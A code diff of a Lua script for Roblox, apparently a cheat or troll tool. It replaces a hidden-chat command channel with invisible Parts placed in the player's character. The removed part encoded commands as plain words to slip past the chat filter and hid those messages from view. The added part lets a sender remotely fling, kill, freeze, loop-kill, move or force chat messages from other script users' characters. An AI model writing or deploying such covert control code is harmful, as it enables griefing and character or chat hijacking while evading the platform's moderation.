@@ -178,139 +178,69 @@ LP.CharacterAdded:Connect(function()
 end)
 
 -- ═══════════════════════════════════════════════════════════
--- P2P SIGNALS  (invisible chat - for premium commands only)
+-- P2P SIGNALS  (ChildAdded on HumanoidRootPart)
 -- ─────────────────────────────────────────────────────────
--- Detection no longer needs chat. Chat is used only to send
--- premium troll command signals between whitelisted scripts.
--- OnIncomingMessage hides these messages from the chat UI.
+-- HOW IT WORKS:
+--   When a LocalScript creates a Part inside its OWN character,
+--   Roblox replicates that to the server then to every client.
+--   ChildAdded fires on every other client — this is exactly
+--   how tools and accessories work. Zero chat, zero filter.
+--
+-- SENDING:
+--   Create a Part named "s_CMD_UID_TICK" inside our HRP.
+--   Debris removes it after 1.5s so HRPs stay clean.
+--
+-- RECEIVING:
+--   Every script watches every whitelisted player's HRP with
+--   ChildAdded. When a "s_" part appears we parse the name
+--   and call HandleSig if the UID matches us.
+--
+-- WHY IT WORKS THIS TIME:
+--   Previous attempt watched GetPropertyChangedSignal("Size")
+--   which does NOT replicate from LocalScript. ChildAdded DOES.
 -- ═══════════════════════════════════════════════════════════
--- ── Word-based encoding ──────────────────────────────────────
--- Every number 0-99 maps to a normal English word.
--- A signal is just 4 words: ANCHOR CMD TUID TICK (+ extra words)
--- To any player it looks like random friendly chat.
--- Roblox filter never tags plain dictionary words.
-local WORDS = {
-    [0]="the",   [1]="and",   [2]="for",   [3]="you",   [4]="are",
-    [5]="was",   [6]="but",   [7]="not",   [8]="with",  [9]="his",
-    [10]="they", [11]="this", [12]="from", [13]="have",  [14]="one",
-    [15]="had",  [16]="her",  [17]="all",  [18]="she",  [19]="been",
-    [20]="who",  [21]="will", [22]="more", [23]="when",  [24]="can",
-    [25]="him",  [26]="your", [27]="out",  [28]="than",  [29]="now",
-    [30]="look", [31]="only", [32]="come", [33]="its",   [34]="over",
-    [35]="also", [36]="back", [37]="use",  [38]="two",   [39]="how",
-    [40]="our",  [41]="any",  [42]="day",  [43]="even",  [44]="most",
-    [45]="give", [46]="him",  [47]="new",  [48]="same",  [49]="old",
-    [50]="very", [51]="just", [52]="find", [53]="here",  [54]="way",
-    [55]="know", [56]="time", [57]="long", [58]="down",  [59]="good",
-    [60]="made", [61]="go",   [62]="my",   [63]="sound", [64]="no",
-    [65]="put",  [66]="end",  [67]="does", [68]="land",  [69]="big",
-    [70]="high", [71]="such", [72]="next", [73]="play",  [74]="small",
-    [75]="set",  [76]="try",  [77]="kind", [78]="hand",  [79]="part",
-    [80]="game", [81]="off",  [82]="keep", [83]="real",  [84]="life",
-    [85]="few",  [86]="nice", [87]="open", [88]="seem",  [89]="hard",
-    [90]="ask",  [91]="late", [92]="move", [93]="world", [94]="want",
-    [95]="left",  [96]="may", [97]="show", [98]="take",  [99]="place",
-}
--- Reverse lookup: word -> number
-local WORD_NUM = {}
-for n,w in pairs(WORDS) do WORD_NUM[w] = n end
 
--- Anchor word — signals always start with this
--- Chosen to be common but still uniquely identifiable as first word
-local ANCHOR = "lol"   -- any whitelisted sender saying "lol ..." triggers parse attempt
+local SIG_PFX = "s"   -- signal part name prefix
+local seenSig = {}    -- dedup table
 
-local seenSig = {}
-
--- Encode a number 0-99999 as up to 3 words (base-100)
-local function encodeNum(n)
-    n = math.floor(n) % 100000
-    local a = math.floor(n / 10000)       -- 0-9   (tens of thousands)
-    local b = math.floor((n % 10000) / 100)  -- 0-99
-    local c2 = n % 100                        -- 0-99
-    -- pack as 3 words, a only uses 0-9 so reuse WORDS[a*10] for compactness
-    return WORDS[a] .. " " .. WORDS[b] .. " " .. WORDS[c2]
-end
-
--- Decode 3 consecutive words back to a number
-local function decodeNum(w1, w2, w3)
-    local a = WORD_NUM[w1]
-    local b = WORD_NUM[w2]
-    local c2 = WORD_NUM[w3]
-    if not a or not b or not c2 then return nil end
-    return a * 10000 + b * 100 + c2
-end
-
--- Hide signal messages from chat UI on ALL clients including the sender.
--- OnIncomingMessage fires before rendering — blank Text = invisible.
--- We check OriginalText so Roblox filtering doesn't obscure our prefix.
-pcall(function()
-    local tcs = game:GetService("TextChatService")
-
-    -- Check if a message is one of our signals (starts with anchor word)
-    local function isSig(msg)
-        local txt = (msg and msg.OriginalText ~= "" and msg.OriginalText)
-                 or (msg and msg.Text) or ""
-        local first = txt:lower():match("^(%S+)")
-        return first == ANCHOR
-    end
-
-    local prevIncoming = tcs.OnIncomingMessage
-    tcs.OnIncomingMessage = function(msg)
-        if isSig(msg) then
-            local props = Instance.new("TextChatMessageProperties")
-            props.Text = ""
-            return props
-        end
-        if prevIncoming then return prevIncoming(msg) end
-    end
-
-    -- Also suppress chat bubbles for signal messages
-    pcall(function()
-        local prevBubble = tcs.OnBubbleAdded
-        tcs.OnBubbleAdded = function(msg, adornee)
-            if isSig(msg) then
-                return Instance.new("BubbleChatMessageProperties")
-            end
-            if prevBubble then return prevBubble(msg, adornee) end
-        end
-    end)
-end)
-
-local lastSend = 0
-local function SendChat(text)
-    local gap = tick() - lastSend
-    if gap < 0.4 then task.wait(0.4 - gap) end
-    lastSend = tick()
-    local sent = false
-    if not sent then pcall(function()
-        local tcs = game:GetService("TextChatService")
-        if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
-            local ch = tcs.TextChannels:FindFirstChild("RBXGeneral")
-            if ch then ch:SendAsync(text) sent = true end
-        end
-    end) end
-    if not sent then pcall(function()
-        local ev = game:GetService("ReplicatedStorage")
-            :FindFirstChild("DefaultChatSystemChatEvents")
-        local sr = ev and ev:FindFirstChild("SayMessageRequest")
-        if sr then sr:FireServer(text,"All") sent = true end
-    end) end
-end
-
--- Format: ANCHOR CMD_WORD TUID(3 words) TICK(3 words) [extra...]
--- e.g. "lol and the you are was but" — looks like chat spam to anyone
+-- ── Send a signal ─────────────────────────────────────────────
 local function SendSig(code, targetUID, extra)
-    local uid  = (targetUID or 0) % 100000
-    local tk   = math.floor(tick() * 10) % 100000
-    -- code is 1-13, encode directly as a word (offset by 10 to avoid low indices)
-    local codeWord = WORDS[code + 10] or WORDS[code]
-    local msg = ANCHOR .. " " .. codeWord .. " " .. encodeNum(uid) .. " " .. encodeNum(tk)
-    if extra and extra ~= "" then msg = msg .. " " .. extra end
-    task.spawn(SendChat, msg)
+    pcall(function()
+        local chr  = LP.Character
+        local root = chr and chr:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+
+        local uid = (targetUID or 0) % 100000
+        local tk  = math.floor(tick() * 10) % 10000
+
+        -- Name encodes everything: s_CODE_UID_TICK
+        local name = SIG_PFX.."_"..code.."_"..uid.."_"..tk
+
+        local p = Instance.new("Part")
+        p.Name         = name
+        p.Size         = Vector3.new(0.05, 0.05, 0.05)
+        p.Transparency = 1
+        p.CanCollide   = false
+        p.Anchored     = false
+        p.Massless     = true
+        p.CastShadow   = false
+
+        -- For chatmsg: store text in a StringValue child
+        if type(extra) == "string" and extra ~= "" then
+            local sv = Instance.new("StringValue")
+            sv.Name   = "x"
+            sv.Value  = extra
+            sv.Parent = p
+        end
+
+        p.Parent = root
+        Debris:AddItem(p, 1.5)  -- auto-cleanup
+    end)
 end
 
--- Signal handler
-local function HandleSig(sender, code, tuid, extra)
+-- ── Signal handler (executes on the RECEIVING client) ─────────
+local function HandleSig(sender, code, tuid, sigPart)
+    -- 0 = broadcast (bringall), otherwise must match our UserId
     if tuid ~= 0 and tuid ~= LP.UserId % 100000 then return end
 
     local c, r, hum
@@ -320,203 +250,206 @@ local function HandleSig(sender, code, tuid, extra)
         hum = c and c:FindFirstChildOfClass("Humanoid")
     end
 
-    if code==1 then
+    if code == 1 then -- fling
         gc() if not r then return end
         local bv = Instance.new("BodyVelocity")
         bv.MaxForce = Vector3.new(1e9,1e9,1e9)
         bv.Velocity = Vector3.new(math.random(-160,160),350,math.random(-160,160))
-        bv.Parent = r Debris:AddItem(bv,0.15)
-        Notify(" Signal","Flung by "..sender.DisplayName,"warning",3)
+        bv.Parent = r
+        Debris:AddItem(bv, 0.15)
+        Notify("Signal","Flung by "..sender.DisplayName,"warning",3)
 
-    elseif code==2 or code==3 then
+    elseif code == 2 or code == 3 then -- bring / bringall
         gc()
         local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
-        if r and sr then r.CFrame = sr.CFrame*CFrame.new(math.random(-4,4),0,math.random(-4,4)) end
-        Notify(" Signal","Brought to "..sender.DisplayName,"info",3)
-
-    elseif code==4 or code==5 then
-        gc() if hum then hum.Health=0 end
-        Notify(" Signal","Killed by "..sender.DisplayName,"error",3)
-
-    elseif code==6 then
-        Config.ActiveCmds["Frozen"]=true RefreshActive() gc()
-        if c then
-            for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.Anchored=true end end
-            if hum then hum.PlatformStand=true end
+        if r and sr then
+            r.CFrame = sr.CFrame * CFrame.new(math.random(-4,4), 0, math.random(-4,4))
         end
-        Notify(" Signal","Frozen by "..sender.DisplayName,"warning",4)
+        Notify("Signal","Brought to "..sender.DisplayName,"info",3)
 
-    elseif code==7 then
-        Config.ActiveCmds["Frozen"]=nil RefreshActive() gc()
+    elseif code == 4 or code == 5 then -- reset / kill
+        gc() if hum then hum.Health = 0 end
+        Notify("Signal","Killed by "..sender.DisplayName,"error",3)
+
+    elseif code == 6 then -- freeze
+        Config.ActiveCmds["Frozen"] = true RefreshActive() gc()
         if c then
-            for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.Anchored=false end end
-            if hum then hum.PlatformStand=false end
+            for _,p in ipairs(c:GetDescendants()) do
+                if p:IsA("BasePart") then p.Anchored = true end
+            end
+            if hum then hum.PlatformStand = true end
         end
-        Notify(" Signal","Unfrozen","info",3)
+        Notify("Signal","Frozen by "..sender.DisplayName,"warning",4)
 
-    elseif code==8 then
+    elseif code == 7 then -- unfreeze
+        Config.ActiveCmds["Frozen"] = nil RefreshActive() gc()
+        if c then
+            for _,p in ipairs(c:GetDescendants()) do
+                if p:IsA("BasePart") then p.Anchored = false end
+            end
+            if hum then hum.PlatformStand = false end
+        end
+        Notify("Signal","Unfrozen","info",3)
+
+    elseif code == 8 then -- kick (void loop)
         if Config.ActiveCmds["Kicked"] then return end
-        Config.ActiveCmds["Kicked"]=true RefreshActive()
-        Notify(" Signal","Kicked by "..sender.DisplayName,"error",4)
+        Config.ActiveCmds["Kicked"] = true RefreshActive()
+        Notify("Signal","Kicked by "..sender.DisplayName,"error",4)
         task.spawn(function()
             while Config.ActiveCmds["Kicked"] do
-                pcall(function() gc()
-                    if r   then r.CFrame=CFrame.new(0,-9999,0) end
-                    if hum then hum.Health=0 end
+                pcall(function()
+                    gc()
+                    if r   then r.CFrame   = CFrame.new(0,-9999,0) end
+                    if hum then hum.Health = 0 end
                 end)
                 task.wait(0.08)
             end
         end)
 
-    elseif code==9 then
-        Config.ActiveCmds["Kicked"]=nil RefreshActive()
-        Notify(" Signal","Kick stopped","info",3)
+    elseif code == 9 then -- unkick
+        Config.ActiveCmds["Kicked"] = nil RefreshActive()
+        Notify("Signal","Kick stopped","info",3)
 
-    elseif code==10 then
+    elseif code == 10 then -- ctrl_start
         if IsPremium() then return end
-        Config.ActiveCmds["Controlled"]=true RefreshActive() gc()
+        Config.ActiveCmds["Controlled"] = true RefreshActive() gc()
         if c then
-            for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.Anchored=true end end
-            if hum then hum.PlatformStand=true end
+            for _,p in ipairs(c:GetDescendants()) do
+                if p:IsA("BasePart") then p.Anchored = true end
+            end
+            if hum then hum.PlatformStand = true end
         end
-        Notify(" Signal","Controlled by "..sender.DisplayName,"warning",5)
+        Notify("Signal","Controlled by "..sender.DisplayName,"warning",5)
 
-    elseif code==11 then
-        Config.ActiveCmds["Controlled"]=nil RefreshActive() gc()
+    elseif code == 11 then -- ctrl_stop
+        Config.ActiveCmds["Controlled"] = nil RefreshActive() gc()
         if c then
-            for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.Anchored=false end end
-            if hum then hum.PlatformStand=false end
-            if r then local bv=r:FindFirstChild("VoidCtrlBV") if bv then bv:Destroy() end end
+            for _,p in ipairs(c:GetDescendants()) do
+                if p:IsA("BasePart") then p.Anchored = false end
+            end
+            if hum then hum.PlatformStand = false end
+            if r then
+                local bv = r:FindFirstChild("VoidCtrlBV")
+                if bv then bv:Destroy() end
+            end
         end
-        Notify(" Signal","Control released","info",3)
+        Notify("Signal","Control released","info",3)
 
-    elseif code==12 then
+    elseif code == 12 then -- ctrl_vel
         if not Config.ActiveCmds["Controlled"] then return end
-        local dirCode,jumpBit = extra:match("(%d+),(%d)")
+        local sv = sigPart and sigPart:FindFirstChild("x")
+        if not sv then return end
+        local dirCode, jumpBit = sv.Value:match("(%d+),(%d)")
         dirCode = tonumber(dirCode) or 0
-        local doJump = jumpBit=="1"
-        local DIR = {[0]=Vector3.zero,
-            [1]=Vector3.new(0,0,-1),[2]=Vector3.new(0,0,1),
-            [3]=Vector3.new(1,0,0), [4]=Vector3.new(-1,0,0),
-            [5]=Vector3.new(1,0,-1),[6]=Vector3.new(-1,0,-1),
-            [7]=Vector3.new(1,0,1), [8]=Vector3.new(-1,0,1),}
+        local doJump = jumpBit == "1"
+        local DIR = {
+            [0]=Vector3.zero,
+            [1]=Vector3.new(0,0,-1), [2]=Vector3.new(0,0,1),
+            [3]=Vector3.new(1,0,0),  [4]=Vector3.new(-1,0,0),
+            [5]=Vector3.new(1,0,-1), [6]=Vector3.new(-1,0,-1),
+            [7]=Vector3.new(1,0,1),  [8]=Vector3.new(-1,0,1),
+        }
         local baseDir = DIR[dirCode] or Vector3.zero
         gc() if not r then return end
         local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
         local dir = baseDir
-        if sr and baseDir.Magnitude>0 then
-            local lv=sr.CFrame.LookVector local rv=sr.CFrame.RightVector
-            dir=Vector3.new(lv.X*(-baseDir.Z)+rv.X*baseDir.X,0,lv.Z*(-baseDir.Z)+rv.Z*baseDir.X)
-            if dir.Magnitude>0.01 then dir=dir.Unit end
+        if sr and baseDir.Magnitude > 0 then
+            local lv = sr.CFrame.LookVector
+            local rv = sr.CFrame.RightVector
+            dir = Vector3.new(
+                lv.X*(-baseDir.Z) + rv.X*baseDir.X, 0,
+                lv.Z*(-baseDir.Z) + rv.Z*baseDir.X)
+            if dir.Magnitude > 0.01 then dir = dir.Unit end
         end
-        local spd=hum and hum.WalkSpeed or 16
-        local bv=r:FindFirstChild("VoidCtrlBV")
+        local spd = hum and hum.WalkSpeed or 16
+        local bv  = r:FindFirstChild("VoidCtrlBV")
         if not bv then
-            bv=Instance.new("BodyVelocity") bv.Name="VoidCtrlBV"
-            bv.MaxForce=Vector3.new(1e9,0,1e9) bv.Parent=r
+            bv           = Instance.new("BodyVelocity")
+            bv.Name      = "VoidCtrlBV"
+            bv.MaxForce  = Vector3.new(1e9,0,1e9)
+            bv.Parent    = r
         end
-        bv.Velocity=dir*spd
+        bv.Velocity = dir * spd
         if doJump then
-            local jbv=Instance.new("BodyVelocity")
-            jbv.MaxForce=Vector3.new(0,1e9,0) jbv.Velocity=Vector3.new(0,60,0)
-            jbv.Parent=r Debris:AddItem(jbv,0.12)
+            local jbv        = Instance.new("BodyVelocity")
+            jbv.MaxForce     = Vector3.new(0,1e9,0)
+            jbv.Velocity     = Vector3.new(0,60,0)
+            jbv.Parent       = r
+            Debris:AddItem(jbv, 0.12)
         end
 
-    elseif code==13 then
-        if not extra or extra=="" then return end
-        local sent=false
+    elseif code == 13 then -- chatmsg
+        local sv = sigPart and sigPart:FindFirstChild("x")
+        local msg = sv and sv.Value or ""
+        if msg == "" then return end
+        local sent = false
         if not sent then pcall(function()
-            local tcs=game:GetService("TextChatService")
-            if tcs.ChatVersion==Enum.ChatVersion.TextChatService then
-                local ch=tcs.TextChannels:FindFirstChild("RBXGeneral")
-                if ch then ch:SendAsync(extra) sent=true end
+            local tcs = game:GetService("TextChatService")
+            if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+                local ch = tcs.TextChannels:FindFirstChild("RBXGeneral")
+                if ch then ch:SendAsync(msg) sent = true end
             end
         end) end
         if not sent then pcall(function()
-            local ev=game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-            local sr2=ev and ev:FindFirstChild("SayMessageRequest")
-            if sr2 then sr2:FireServer(extra,"All") end
+            local ev  = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+            local sr2 = ev and ev:FindFirstChild("SayMessageRequest")
+            if sr2 then sr2:FireServer(msg, "All") end
         end) end
     end
 end
 
--- Parse incoming word-encoded signals
--- Format: ANCHOR CMDWORD W1 W2 W3 W4 W5 W6 [extra...]
-local function OnSig(speaker, msg)
-    if not msg or speaker == LP then return end
-    -- Only handle if sender is whitelisted (prevents outsiders spoofing)
-    if not IsWhitelisted(speaker) then return end
+-- ── Watch a player's HRP for signal parts ─────────────────────
+local function WatchHRP(player, hrp)
+    hrp.ChildAdded:Connect(function(child)
+        -- Signal parts are named "s_CODE_UID_TICK"
+        local name = child.Name
+        if name:sub(1,2) ~= SIG_PFX.."_" then return end
 
-    local parts = msg:lower():split(" ")
-    -- Must start with anchor word
-    if parts[1] ~= ANCHOR then return end
-    -- Need at least 8 words: anchor + cmdword + 3(uid) + 3(tick) = 8
-    if #parts < 8 then return end
+        task.spawn(function()
+            task.wait(0.05)  -- tiny wait for StringValue child to replicate
+            pcall(function()
+                local parts = name:split("_")
+                -- parts = {"s", "CODE", "UID", "TICK"}
+                local code = tonumber(parts[2])
+                local uid  = tonumber(parts[3])
+                local tk   = parts[4] or ""
+                if not code or not uid then return end
 
-    -- Decode command
-    local codeWord = parts[2]
-    local code = nil
-    for n, w in pairs(WORDS) do
-        if w == codeWord then code = n - 10 break end
-    end
-    if not code or code < 1 then return end
+                -- Only handle signals from whitelisted players
+                if not IsWhitelisted(player) then return end
 
-    -- Decode uid (words 3,4,5)
-    local tuid = decodeNum(parts[3], parts[4], parts[5])
-    if not tuid then return end
+                -- Dedup
+                local key = tostring(player.UserId)..":"..code..":"..uid..":"..tk
+                if seenSig[key] then return end
+                seenSig[key] = true
+                task.delay(5, function() seenSig[key] = nil end)
 
-    -- Decode tick for dedup (words 6,7,8)
-    local tk = decodeNum(parts[6], parts[7], parts[8])
-    if not tk then return end
-
-    -- Extra data starts at word 9
-    local extra = #parts >= 9 and table.concat(parts, " ", 9) or ""
-
-    local key = tostring(speaker.UserId)..":"..code..":"..tuid..":"..tk
-    if seenSig[key] then return end
-    seenSig[key] = true
-    task.delay(5, function() seenSig[key] = nil end)
-
-    task.spawn(HandleSig, speaker, code, tuid, extra)
+                HandleSig(player, code, uid, child)
+            end)
+        end)
+    end)
 end
 
--- Hook both chat systems for signal receiving
-local function WatchSigs(player)
-    player.Chatted:Connect(function(msg) task.spawn(OnSig,player,msg) end)
-end
-for _,p in ipairs(Players:GetPlayers()) do
-    if p~=LP then WatchSigs(p) end
-end
-Players.PlayerAdded:Connect(function(p)
-    if p~=LP then WatchSigs(p) end
-end)
-pcall(function()
-    local tcs=game:GetService("TextChatService")
-    if tcs.ChatVersion==Enum.ChatVersion.TextChatService then
-        tcs.MessageReceived:Connect(function(msg)
-            local src=msg and msg.TextSource
-            if not src then return end
-            local p=Players:GetPlayerByUserId(src.UserId)
-            if not p or p==LP then return end
-            local raw=(msg.OriginalText~="") and msg.OriginalText or msg.Text
-            task.spawn(OnSig,p,raw)
+-- Watch a player's current and future characters
+local function WatchPlayer(player)
+    local function onChar(char)
+        task.spawn(function()
+            local hrp = char:WaitForChild("HumanoidRootPart", 10)
+            if hrp then WatchHRP(player, hrp) end
         end)
     end
+    if player.Character then onChar(player.Character) end
+    player.CharacterAdded:Connect(onChar)
+end
+
+-- Watch all current players (skip self — we send, not receive our own)
+for _, p in ipairs(Players:GetPlayers()) do
+    if p ~= LP then WatchPlayer(p) end
+end
+Players.PlayerAdded:Connect(function(p)
+    if p ~= LP then WatchPlayer(p) end
 end)
 
--- ═══════════════════════════════════════════════════════════
--- PREMIUM CHAT COMMANDS
--- ─────────────────────────────────────────────────────────
--- Premium users type commands directly in Roblox chat:
---   .fling PlayerName
---   .bring PlayerName
---   .bringall
---   .freeze PlayerName
---   .reset PlayerName
---   .kick PlayerName       (kick PlayerName stop to stop)
---   .chat PlayerName message here
--- Target must be whitelisted. Premium users cannot be targeted.
--- ═══════════════════════════════════════════════════════════
 
 -- =========================================================
 -- Export detection state for commands module
